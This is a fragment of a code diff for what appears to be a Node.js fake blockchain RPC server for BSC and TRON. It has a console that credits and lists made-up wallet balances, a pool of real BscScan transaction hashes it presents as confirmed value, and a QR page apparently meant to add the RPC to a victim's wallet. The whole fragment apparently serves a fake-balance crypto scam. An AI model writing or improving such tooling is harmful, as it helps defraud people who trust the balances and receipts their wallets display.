+                console.log("\n--- LIVE BSCSCAN CONFIRMED VALUE HASHES READY ---");
+                for (const item of liveBscValuePool.slice(0, 12)) {
+                    console.log(`  [${item.type}] ~$${item.amountUsd.toLocaleString("en-US", { maximumFractionDigits: 2 })} USD -> https://bscscan.com/tx/${item.hash}`);
+                }
+                console.log("");
+            } else if (cmd === "list" || cmd === "wallets" || cmd === "status") {
+                console.log("\n--- TRACKED WALLETS & BALANCES ---");
+                for (const [k, bals] of Object.entries(state.wallets)) {
+                    const bnbFormatted = (Number(BigInt(bals.BNB || "0")) / 1e18).toFixed(4);
+                    const tokenList = Object.entries(bals)
+                        .filter(([sym]) => sym !== "BNB")
+                        .map(([sym, val]) => `${(Number(val) / 1e6).toLocaleString()} ${sym}`)
+                        .join(", ");
+                    console.log(`  0x${k} | Nonce: ${state.nonces[k] || 0} | BNB: ${bnbFormatted} | ${tokenList}`);
+                }
+                console.log("");
+            } else if (cmd !== "") {
+                console.log("Commands: credit, coin, transfer, swap, match, list");
+            }
+        } catch (e) {
+            console.log(`[!] Error: ${e.message}`);
+        }
+        rl.prompt();
+    });
+}
+
 server.listen(CONFIG.port, "0.0.0.0", () => {
     console.log("==================================================================");
-    console.log(`[+] VERIFIED TRANSFER + LIVE BSCSCAN RPC ONLINE ON PORT ${CONFIG.port}`);
-    console.log(`[+] Local RPC URL : http://127.0.0.1:${CONFIG.port}`);
-    console.log(`[+] Block Explorer: https://bscscan.com (Live Confirmed USDT Hashes)`);
+    console.log(`[+] ULTIMATE V7 BSC + TRON OWN-RPC LIVE ON PORT ${CONFIG.port}`);
+    console.log(`[+] RPC URL              : http://127.0.0.1:${CONFIG.port}`);
+    console.log(`[+] 1-Scan QR Auto-Adder : http://127.0.0.1:${CONFIG.port}/qr`);
+    console.log(`[+] Pending Fix          : Instant Receipt + RLP Nonce Sync Enabled`);
     console.log("==================================================================");
+    startInteractiveCli();
 });
